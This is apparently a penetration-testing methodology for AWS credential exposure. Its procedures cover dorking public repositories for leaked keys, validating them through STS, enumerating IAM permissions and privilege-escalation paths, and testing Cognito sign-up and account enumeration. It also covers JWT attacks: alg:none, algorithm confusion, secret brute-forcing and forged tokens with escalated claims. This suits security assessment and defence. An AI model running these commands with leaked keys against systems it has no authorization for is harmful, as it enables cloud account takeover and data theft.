Repeatability: per_asset
Prerequisites: Unauthenticated — OSINT, source code analysis, public repository access
Description: This methodology covers the discovery and validation of exposed AWS credentials, secrets, and sensitive tokens across public code repositories, JavaScript bundles, and web application source code. It includes scanning for hardcoded AWS access keys, secret keys, ARNs, account IDs, Cognito configuration values, and JWT tokens. Discovered credentials are validated for active access and enumerated for permissions. Cognito user pool misconfigurations such as open self-registration and account enumeration are also tested. Credential exposure in public sources is consistently rated as a critical-severity finding due to the potential for full account compromise.
Tags: credential-exposure, github, trufflehog, gitleaks, cognito, jwt, secret-scanning, osint, aws-keys, arn, account-id, enumerate-iam
Potential Severity: critical

------------------------------------------
Procedure 0 — Search Public Code Repositories for AWS Keys, ARNs, and Account IDs
Tools: GitHub Search, GitLab Search, Bitbucket Search, cloud_enum, gitrob, shhgit, grep
Intrusiveness: passive
Description: Manually and programmatically search public code repositories (GitHub, GitLab, Bitbucket) for leaked AWS access key IDs, secret access keys, ARNs, and 12-digit account IDs associated with the target organization. Exposed credentials in public repos are one of the most common root causes of cloud breaches.

Step 1: Identify the target organization's known GitHub/GitLab/Bitbucket organizations and employee accounts. Search LinkedIn, the company website, and job postings for developer usernames and organization names.

Step 2: Use GitHub advanced search (code search) to look for AWS access key patterns associated with the target organization or domain:
  - Search GitHub web UI or API:
    `https://github.com/search?q=org%3A<target-org>+AKIA&type=code`
    `https://github.com/search?q=<target-domain>+AWS_SECRET_ACCESS_KEY&type=code`

Step 3: Search for AWS account IDs and ARNs:
  - `https://github.com/search?q=org%3A<target-org>+arn%3Aaws&type=code`
  - `https://github.com/search?q="<target-domain>"+arn%3Aaws%3Aiam&type=code`

Step 4: Use GitHub dork queries for common credential leak patterns:
  - `"<target-domain>" filename:.env AWS_ACCESS_KEY_ID`
  - `"<target-domain>" filename:credentials aws_secret_access_key`
  - `"<target-domain>" filename:.bash_history aws`
  - `"<target-domain>" filename:docker-compose.yml AWS`
  - `"<target-domain>" filename:terraform.tfvars`
  - `"<target-domain>" extension:pem PRIVATE KEY`

Step 5: Repeat the same dork queries on GitLab and Bitbucket:
  - GitLab: `https://gitlab.com/search?search=<target-domain>+AKIA&scope=blobs`
  - Bitbucket: Use Bitbucket's code search or the API endpoint `/2.0/search/code?search_query=<target-domain>+AKIA`

Step 6: Use cloud_enum to discover cloud resources tied to the target keyword that may reveal account details:
  `cloud_enum -k <target-keyword> -l cloud_enum_results.txt`

Step 7: Search for AWS account IDs in public S3 bucket policies, GitHub issues, Stack Overflow posts, and Pastebin using Google dorks:
  - `site:stackoverflow.com "<target-domain>" "arn:aws"`
  - `site:pastebin.com "<target-domain>" AKIA`

Step 8: Collect and catalog all discovered keys (AKIA*, ASIA*), ARNs, account IDs, and any secret access keys into a structured findings log for validation in subsequent procedures.

Flag: Any AWS access key ID (AKIA/ASIA prefix), secret access key, ARN, or 12-digit account ID found in a publicly accessible code repository or paste site constitutes a finding.

------------------------------------------
Procedure 1 — Run TruffleHog and Gitleaks Against Discovered Public Repositories
Tools: trufflehog, gitleaks
Intrusiveness: passive
Description: Perform automated deep scanning of all discovered public repositories using TruffleHog and Gitleaks to identify secrets, API keys, and credentials embedded in commit history. These tools inspect every commit, branch, and tag — catching secrets that were committed and then removed but remain in git history.

Step 1: Install or update trufflehog and gitleaks:
  `brew install trufflehog` or `pip install trufflehog`
  `brew install gitleaks` or download from https://github.com/gitleaks/gitleaks/releases

Step 2: Run trufflehog against each discovered GitHub organization:
  `trufflehog github --org=<target-org> --only-verified --json > trufflehog_org_results.json`

Step 3: Run trufflehog against individual repositories:
  `trufflehog git https://github.com/<target-org>/<repo>.git --only-verified --json > trufflehog_repo_results.json`

Step 4: For broader scanning across all discovered repos, scan entire GitHub users:
  `trufflehog github --user=<developer-username> --only-verified --json >> trufflehog_user_results.json`

Step 5: Run trufflehog against GitLab repositories:
  `trufflehog gitlab --repo=https://gitlab.com/<target-org>/<repo>.git --only-verified --json > trufflehog_gitlab_results.json`

Step 6: Run gitleaks against each cloned repository to scan full commit history:
  `git clone https://github.com/<target-org>/<repo>.git /tmp/<repo>`
  `gitleaks detect --source /tmp/<repo> --report-format json --report-path gitleaks_<repo>_results.json --verbose`

Step 7: Run gitleaks with the --log-opts flag to scan specific branches or date ranges if needed:
  `gitleaks detect --source /tmp/<repo> --log-opts="--all" --report-format json --report-path gitleaks_<repo>_full.json`

Step 8: Scan any discovered non-Git sources (S3 buckets, file shares) with trufflehog filesystem mode:
  `trufflehog filesystem --directory=/path/to/downloaded/files --only-verified --json > trufflehog_filesystem_results.json`

Step 9: Aggregate all findings, deduplicate, and cross-reference with results from Procedure 0. Prioritize any verified/active credentials for immediate validation.

Flag: Any verified secret, AWS access key, or credential detected by trufflehog or gitleaks in the commit history of a public repository is a finding, even if the secret has since been removed from the current branch HEAD.

------------------------------------------
Procedure 2 — Validate Discovered AWS Access Keys via STS
Tools: aws cli
Intrusiveness: low
Description: Validate all discovered AWS access key pairs by calling the AWS Security Token Service (STS) GetCallerIdentity API. This confirms whether the credentials are active and reveals the associated AWS account ID, IAM principal ARN, and user/role identity. This is a non-destructive, read-only API call that does not require any specific IAM permissions and cannot be denied by IAM policy.

Step 1: Configure the discovered credentials in a named AWS CLI profile to avoid contaminating your default profile:
  `aws configure --profile discovered-key-1`
  - Enter the discovered AWS Access Key ID (AKIA...)
  - Enter the discovered AWS Secret Access Key
  - Set default region to us-east-1 (or leave blank)
  - Set output format to json

Step 2: Alternatively, export the credentials as environment variables for one-time use:
  `export AWS_ACCESS_KEY_ID=AKIA...`
  `export AWS_SECRET_ACCESS_KEY=...`
  `export AWS_DEFAULT_REGION=us-east-1`

Step 3: Call STS GetCallerIdentity to validate the key pair:
  `aws sts get-caller-identity --profile discovered-key-1`

Step 4: Examine the response. A successful response will include:
  - Account: The 12-digit AWS account ID
  - Arn: The full ARN of the IAM principal (user, role, or federated identity)
  - UserId: The unique user/role identifier
  If the call fails with "InvalidClientTokenId" or "SignatureDoesNotMatch", the credentials are invalid or expired.

Step 5: For temporary credentials (ASIA* prefix), also set the session token:
  `export AWS_SESSION_TOKEN=...`
  `aws sts get-caller-identity`

Step 6: Record all validated credentials with their corresponding account ID, ARN, and principal type. Note whether the principal is an IAM user, IAM role, root account, or federated session.

Step 7: Check if the key has any attached console login capability:
  `aws iam get-login-profile --user-name <username-from-arn> --profile discovered-key-1`

Flag: Any discovered AWS access key that returns a valid response from `aws sts get-caller-identity` (i.e., the key is active and authenticates successfully) is a critical finding.

------------------------------------------
Procedure 3 — Enumerate Permissions on Validated Keys
Tools: enumerate-iam, Pacu, CloudFox, aws cli
Intrusiveness: low
Description: After validating that discovered AWS credentials are active, enumerate the permissions associated with those credentials to determine the blast radius of the exposure. This reveals what actions an attacker could perform with the leaked keys.

Step 1: Install enumerate-iam:
  `git clone https://github.com/andresriancho/enumerate-iam.git`
  `cd enumerate-iam && pip install -r requirements.txt`

Step 2: Run enumerate-iam against the validated credentials to brute-force API access:
  `python enumerate-iam.py --access-key AKIA... --secret-key ... --region us-east-1`
  This will attempt calls to hundreds of AWS API actions and report which ones succeed.

Step 3: For temporary (STS) credentials, include the session token:
  `python enumerate-iam.py --access-key ASIA... --secret-key ... --session-token ... --region us-east-1`

Step 4: Use the AWS CLI to attempt targeted high-value enumeration calls:
  `aws iam get-user --profile discovered-key-1`
  `aws iam list-attached-user-policies --user-name <username> --profile discovered-key-1`
  `aws iam list-user-policies --user-name <username> --profile discovered-key-1`
  `aws iam list-groups-for-user --user-name <username> --profile discovered-key-1`

Step 5: If IAM read access is available, retrieve the actual policy documents:
  `aws iam get-policy-version --policy-arn <policy-arn> --version-id v1 --profile discovered-key-1`
  `aws iam get-user-policy --user-name <username> --policy-name <policy-name> --profile discovered-key-1`

Step 6: Use Pacu for deeper automated enumeration:
  `pacu`
  `set_keys` (enter the discovered credentials)
  `run iam__enum_permissions`
  `run iam__enum_users_roles_policies_groups`
  `whoami`

Step 7: Use CloudFox with the validated credentials profile for environment enumeration:
  `cloudfox aws --profile discovered-key-1 all-checks`

Step 8: Check for privilege escalation paths using known IAM misconfigurations:
  `run iam__privesc_scan` (in Pacu)

Step 9: Document every allowed API action, the attached policies, group memberships, and any privilege escalation paths identified. Categorize the access level (read-only, read-write, administrative).

Flag: Any validated key that has permissions beyond zero (i.e., can successfully call any AWS API action) is a finding. Keys with write, administrative, or privilege escalation capabilities are critical findings.

------------------------------------------
Procedure 4 — Check for Exposed Cognito App Client IDs and Secrets in JS Bundles and Source
Tools: browser developer tools, wget, curl, grep, trufflehog, gitleaks, JS Beautifier
Intrusiveness: passive
Description: Amazon Cognito user pool and identity pool configuration values (User Pool IDs, App Client IDs, App Client Secrets, Identity Pool IDs) are frequently embedded in client-side JavaScript bundles, mobile application binaries, and public source code. While App Client IDs alone are not secrets, they can be combined with other configuration to enable unauthorized access flows.

Step 1: Browse the target web application and open browser developer tools (F12). Navigate to the Sources or Network tab and search JavaScript files for Cognito-related strings:
  - Search terms: `cognito`, `userPoolId`, `userPoolWebClientId`, `aws_user_pools_id`, `aws_user_pools_web_client_id`, `identityPoolId`, `aws_cognito_identity_pool_id`, `CognitoUserPool`, `AWSCognito`

Step 2: Download all JavaScript bundles from the target application for offline analysis:
  `wget -r -l 2 -A "*.js,*.js.map" --no-parent https://<target-domain>/`
  or
  `curl -s https://<target-domain>/ | grep -oP 'src="[^"]*\.js"' | sed 's/src="//;s/"//' | while read js; do curl -s "https://<target-domain>/$js" -o "$(basename $js)"; done`

Step 3: Beautify minified JavaScript for easier analysis:
  `npx js-beautify -f <bundle.js> -o <bundle_beautified.js>`

Step 4: Search downloaded JavaScript files for Cognito configuration:
  `grep -rniE "(us-east-1_[A-Za-z0-9]{9}|[0-9a-z]{26}|cognito-idp\.|cognito-identity\.|userPoolId|clientId|identityPoolId|aws_user_pools)" ./*.js`

Step 5: Search for AWS Amplify or SDK configuration objects that may contain Cognito settings:
  `grep -rniE "(Amplify\.configure|aws-exports|awsmobile|Auth\.configure)" ./*.js`

Step 6: Run trufflehog against downloaded JS bundles:
  `trufflehog filesystem --directory=./downloaded_js/ --json > trufflehog_js_results.json`

Step 7: Check mobile app binaries (APK/IPA) if in scope. Decompile and search for Cognito values:
  - Android: `apktool d <app.apk> -o app_decompiled/ && grep -rniE "us-east-1_|cognito" app_decompiled/`
  - iOS: Use class-dump or similar tools to extract strings

Step 8: Search public source code repositories for Cognito configuration tied to the target:
  `https://github.com/search?q="<target-domain>"+userPoolId&type=code`
  `https://github.com/search?q="<target-domain>"+cognito-idp&type=code`

Step 9: Document all discovered Cognito User Pool IDs (format: `<region>_<alphanumeric>`), App Client IDs, App Client Secrets, and Identity Pool IDs (format: `<region>:<uuid>`).

Flag: Exposed Cognito App Client IDs are a finding if they can be used to perform authentication actions (see Procedure 5). Exposed App Client Secrets or Identity Pool IDs with unauthenticated access enabled are critical findings.

------------------------------------------
Procedure 5 — Test Cognito User Pools for Self-Registration and Account Enumeration
Tools: aws cli, curl, Burp Suite
Intrusiveness: medium
Description: Test whether Cognito User Pools discovered in Procedure 4 allow unauthenticated self-registration (sign-up) and whether the User Pool leaks information about existing accounts through error message differences (account enumeration). Open self-registration can allow attackers to create accounts and access resources, while account enumeration aids in targeted attacks.

Step 1: Using the discovered User Pool App Client ID, attempt to sign up a new user via the Cognito API:
  `aws cognito-idp sign-up \
    --client-id <app-client-id> \
    --username testuser-pentest@<attacker-domain> \
    --password 'T3stP@ssw0rd!Str0ng' \
    --region <region>`

Step 2: If an App Client Secret is required, compute the SECRET_HASH:
  `python3 -c "
  import hmac, hashlib, base64
  msg = 'testuser-pentest@<attacker-domain>' + '<app-client-id>'
  dig = hmac.new(b'<app-client-secret>', msg.encode('utf-8'), hashlib.sha256).digest()
  print(base64.b64encode(dig).decode())
  "`
  Then include `--secret-hash <computed-hash>` in the sign-up command.

Step 3: Analyze the response:
  - If sign-up succeeds → self-registration is enabled (finding)
  - If "UsernameExistsException" → self-registration is enabled AND existing usernames leak
  - If "NotAuthorizedException: SignUp is not permitted for this user pool" → self-registration is disabled
  - If "InvalidParameterException" → additional attributes may be required; check password policy

Step 4: Test for account enumeration by attempting operations against known and unknown usernames:
  `aws cognito-idp initiate-auth \
    --client-id <app-client-id> \
    --auth-flow USER_PASSWORD_AUTH \
    --auth-parameters USERNAME=known-user@target.com,PASSWORD=wrongpassword \
    --region <region>`
  Compare error messages between existing and non-existing users. Different error messages indicate account enumeration is possible.

Step 5: Test the forgot-password flow for account enumeration:
  `aws cognito-idp forgot-password \
    --client-id <app-client-id> \
    --username known-user@target.com \
    --region <region>`
  `aws cognito-idp forgot-password \
    --client-id <app-client-id> \
    --username nonexistent-user@target.com \
    --region <region>`
  Compare the responses and error messages for differences.

Step 6: If self-registration succeeded, attempt to confirm the account and authenticate:
  `aws cognito-idp confirm-sign-up \
    --client-id <app-client-id> \
    --username testuser-pentest@<attacker-domain> \
    --confirmation-code <code-from-email> \
    --region <region>`

Step 7: After successful authentication, check what resources the authenticated identity can access via the Cognito Identity Pool:
  `aws cognito-identity get-id \
    --identity-pool-id <identity-pool-id> \
    --logins cognito-idp.<region>.amazonaws.com/<user-pool-id>=<id-token> \
    --region <region>`
  `aws cognito-identity get-credentials-for-identity \
    --identity-id <identity-id> \
    --logins cognito-idp.<region>.amazonaws.com/<user-pool-id>=<id-token> \
    --region <region>`

Step 8: Test for unauthenticated Identity Pool access (no logins parameter):
  `aws cognito-identity get-id \
    --identity-pool-id <identity-pool-id> \
    --region <region>`
  `aws cognito-identity get-credentials-for-identity \
    --identity-id <identity-id> \
    --region <region>`
  If this returns AWS credentials, the Identity Pool allows unauthenticated access.

Step 9: [DOCUMENT ONLY] If a test account was created, document it for cleanup. Do not leave test accounts in production user pools without client authorization.

Flag: Self-registration enabled on a Cognito User Pool is a finding. Account enumeration via differing error messages is a finding. Unauthenticated Identity Pool access returning valid AWS credentials is a critical finding.

------------------------------------------
Procedure 6 — Check for Exposed JWT Tokens and Test Signing Key Attacks
Tools: jwt_tool, jwt.io, Burp Suite, curl, aws cli
Intrusiveness: medium
Description: Search for exposed JSON Web Tokens (JWTs) in client-side code, local storage, URLs, and HTTP responses. Test whether discovered JWTs can be tampered with due to weak signing key configurations, algorithm confusion attacks (alg:none, RS256→HS256), or use of default/weak signing secrets. Cognito-issued JWTs use RS256 with public JWKS endpoints, which may be exploitable if validation is improperly implemented.

Step 1: Search for JWTs in the target application. Check browser local storage, session storage, cookies, URL parameters, and HTTP response headers:
  - Browser DevTools → Application → Local Storage / Session Storage: search for tokens starting with `eyJ`
  - Browser DevTools → Network: inspect response headers and bodies for `Authorization: Bearer eyJ...` or token fields

Step 2: Extract JWTs from downloaded JavaScript bundles and source code:
  `grep -rnoE 'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]*' ./*.js`

Step 3: Decode discovered JWTs to examine their claims (use jwt.io or jwt_tool):
  `python3 -m jwt_tool <token>`
  Examine the header (alg, kid) and payload (iss, sub, aud, exp, iat, cognito:groups, custom claims).

Step 4: Check if the token is expired by comparing the `exp` claim to the current Unix timestamp:
  `date +%s` (current time)
  If `exp` > current time, the token is still valid.

Step 5: Retrieve the JWKS (JSON Web Key Set) for Cognito-issued tokens to obtain the public signing keys:
  `curl -s https://cognito-idp.<region>.amazonaws.com/<user-pool-id>/.well-known/jwks.json | python3 -m json.tool`

Step 6: Test for algorithm confusion attacks using jwt_tool:
  - Test alg:none attack:
    `python3 jwt_tool.py <token> -X a`
  - Test RS256 to HS256 confusion (sign with the public key as HMAC secret):
    `python3 jwt_tool.py <token> -X k -pk <public-key-file>`

Step 7: Test for weak HMAC signing secrets by brute-forcing with a wordlist:
  `python3 jwt_tool.py <token> -C -d /path/to/wordlists/jwt-secrets.txt`
  `hashcat -a 0 -m 16500 <token> /path/to/wordlists/rockyou.txt`

Step 8: If a weak signing key is discovered or algorithm confusion succeeds, craft a tampered token:
  `python3 jwt_tool.py <token> -T -S hs256 -p "<discovered-secret>"`
  Modify claims such as `sub`, `cognito:groups`, `email`, `custom:role` to escalate privileges.

Step 9: Test the tampered token against the application's API endpoints:
  `curl -H "Authorization: Bearer <tampered-token>" https://<target-api>/protected-endpoint`

Step 10: For Cognito tokens, verify whether the application properly validates the token issuer, audience, and expiration. Test with:
  - An expired token (should be rejected)
  - A token from a different user pool (should be rejected)
  - A token with modified claims but valid signature (should be rejected by app-level validation)

Step 11: Check if Cognito refresh tokens are exposed and attempt to obtain new access tokens:
  `aws cognito-idp initiate-auth \
    --client-id <app-client-id> \
    --auth-flow REFRESH_TOKEN_AUTH \
    --auth-parameters REFRESH_TOKEN=<discovered-refresh-token> \
    --region <region>`

Flag: Any valid (non-expired) JWT token found in public source code, client-side storage without httpOnly/secure flags, or URL parameters is a finding. Successful algorithm confusion, weak signing key discovery, or token forgery is a critical finding. Exposed refresh tokens that can be exchanged for new access tokens are a critical finding.

------------------------------------------
References:
- https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_access-keys.html
- https://docs.aws.amazon.com/STS/latest/APIReference/API_GetCallerIdentity.html
- https://docs.aws.amazon.com/cognito/latest/developerguide/cognito-user-pools-app-idp-settings.html
- https://docs.aws.amazon.com/cognito/latest/developerguide/amazon-cognito-user-pools-using-tokens-verifying-a-jwt.html
- https://docs.aws.amazon.com/cognito/latest/developerguide/identity-pools.html
- https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-services/aws-cognito-enum
- https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated
- https://notsosecure.com/hacking-aws-cognito-misconfigurations
- https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p1/
- https://github.com/trufflesecurity/trufflehog
- https://github.com/gitleaks/gitleaks
- https://github.com/andresriancho/enumerate-iam
- https://github.com/ticarpi/jwt_tool
- https://portswigger.net/web-security/jwt
- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens
